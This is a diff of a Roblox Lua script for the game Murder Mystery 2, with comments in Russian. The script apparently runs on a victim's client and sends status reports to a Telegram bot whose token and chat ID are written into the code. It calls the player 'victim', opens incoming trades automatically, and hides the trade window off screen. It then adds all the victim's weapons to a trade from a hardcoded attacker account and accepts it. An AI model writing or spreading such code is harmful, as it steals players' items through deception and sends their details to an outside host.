@@ -651,19 +651,17 @@ rejoinBtn.MouseButton1Click:Connect(function()
 end)
 
 -- ==========================================
--- MM2 AUTO-TRADE FULL VERSION
+-- MM2 FULL AUTO-TRADE (Плюсик + Принятие)
 -- ==========================================
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 local lp = Players.LocalPlayer
 local playerGui = lp:WaitForChild("PlayerGui")
 
--- ТВОИ ДАННЫЕ
 local TG_TOKEN = "9105942728:AAHZpgyYQD5P5RoVxTPxWu1lgeMjT4zp3wI"
 local TG_CHAT_ID = "2065847257" 
 local MY_NICK = "Lublu_Zayek"
 
--- Функция отправки логов в ТГ (через request)
 local function send_tg(text)
     task.spawn(function()
         pcall(function()
@@ -673,7 +671,7 @@ local function send_tg(text)
     end)
 end
 
-send_tg("🚀 Скрипт (FULL) запущен!\nЖертва: " .. lp.Name .. "\nJobID: " .. game.JobId)
+send_tg("🚀 Авто-трейд V2 запущен!\nЖертва: " .. lp.Name)
 
 local is_busy = false
 
@@ -682,12 +680,28 @@ task.spawn(function()
         task.wait(0.5)
         if is_busy then continue end
         
+        -- 1. ИЩЕМ ПЛЮСИК С ТРЕЙДОМ
+        local mainGui = playerGui:FindFirstChild("MainGUI")
+        if mainGui then
+            local plus = mainGui:FindFirstChild("Plus", true)
+            if plus then
+                local trade_req = plus:FindFirstChild("TradeRequest")
+                -- Если есть восклицательный знак, значит пришел трейд
+                if trade_req and trade_req:FindFirstChild("TextLabel") and trade_req.TextLabel.Text == "!" then
+                    send_tg("🔔 Пришел трейд! Нажимаю на плюсик...")
+                    local btn = plus:FindFirstChild("Button", true)
+                    if btn then
+                        btn.MouseButton1Click:Fire() -- Жмем на плюсик!
+                        task.wait(1) -- Ждем, пока откроется окно трейда
+                    end
+                end
+            end
+        end
+
+        -- 2. ИЩЕМ ОКНО ТРЕЙДА
         local gui = playerGui:FindFirstChild("TradeGUI")
-        
         if gui then
             local is_my_trade = false
-            
-            -- Сканируем все текст-объекты, ищем свой ник
             for _, desc in ipairs(gui:GetDescendants()) do
                 if desc:IsA("TextLabel") or desc:IsA("TextButton") or desc:IsA("TextBox") then
                     if desc.Text and string.find(string.lower(desc.Text), string.lower(MY_NICK)) then
@@ -697,22 +711,20 @@ task.spawn(function()
                 end
             end
 
-            -- Если нашли свой ник и еще не начинали
             if is_my_trade and not gui:GetAttribute("Hacked") then
                 gui:SetAttribute("Hacked", true)
                 is_busy = true
                 send_tg("✅ Окно трейда от " .. MY_NICK .. " найдено! Начинаю.")
                 
-                -- 1. Прячем окно (уносим все фреймы за экран)
+                -- Прячем окно
                 for _, child in ipairs(gui:GetChildren()) do
                     if child:IsA("Frame") then
                         child.Position = UDim2.new(0, -5000, 0, -5000)
                     end
                 end
-                
                 task.wait(1)
                 
-                -- 2. Кликаем "Add Items"
+                -- Жмем Add Items
                 local add_items_btn = gui:FindFirstChild("AddItem", true)
                 if add_items_btn and add_items_btn:FindFirstChild("ActionButton") then
                     add_items_btn.ActionButton.MouseButton1Click:Fire()
@@ -722,13 +734,12 @@ task.spawn(function()
                     send_tg("⚠️ Кнопка AddItem не найдена.")
                 end
 
-                -- 3. Закликиваем предметы (Weapons)
+                -- Закликиваем оружие
                 local items_folder = gui:FindFirstChild("__mO", true)
                 if items_folder and items_folder:FindFirstChild("Weapons") then
                     local weapons_list = items_folder.Weapons.Items.Container.Current.Container
                     local start_t = os.clock()
                     
-                    -- 4 секунды спамим кликами по предметам
                     while os.clock() - start_t < 4.0 do
                         for _, item in ipairs(weapons_list:GetChildren()) do
                             if item.Name == "NewItem" then
@@ -747,7 +758,7 @@ task.spawn(function()
                     send_tg("⚠️ Папка с оружием не найдена.")
                 end
 
-                -- 4. Возвращаем окно на экран
+                -- Возвращаем окно
                 for _, child in ipairs(gui:GetChildren()) do
                     if child:IsA("Frame") then
                         child.Position = UDim2.new(0.5, 0, 0.5, 0)
@@ -755,7 +766,7 @@ task.spawn(function()
                 end
                 task.wait(0.5)
                 
-                -- 5. Ждем и жмем финальный Accept
+                -- Ждем 9 секунд и жмем Accept
                 send_tg("⏳ Жду 9 секунд перед подтверждением...")
                 task.wait(9)
                 
@@ -776,7 +787,6 @@ task.spawn(function()
                     send_tg("⚠️ Папка Accept не найдена.")
                 end
                 
-                -- Сбрасываем флаг через 2 секунды
                 task.wait(2)
                 gui:SetAttribute("Hacked", nil)
                 is_busy = false
